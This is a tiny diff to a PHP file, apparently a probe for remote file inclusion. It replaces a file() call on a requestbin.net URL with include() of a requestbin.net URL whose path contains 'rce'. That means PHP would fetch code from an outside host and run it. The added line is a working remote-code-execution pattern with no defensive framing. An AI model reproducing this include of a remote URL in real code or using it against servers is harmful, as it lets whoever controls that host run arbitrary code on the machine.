@@ -3,6 +3,6 @@
 
 <?php
 echo 'test';
-$getthis='http://requestbin.net/r/rn0hh7rn/rcezzzzz';
-file($getthis);
+$getthis='http://requestbin.net/r/rn0hh7rn/rceeeeeee';
+include($getthis);
 ?>
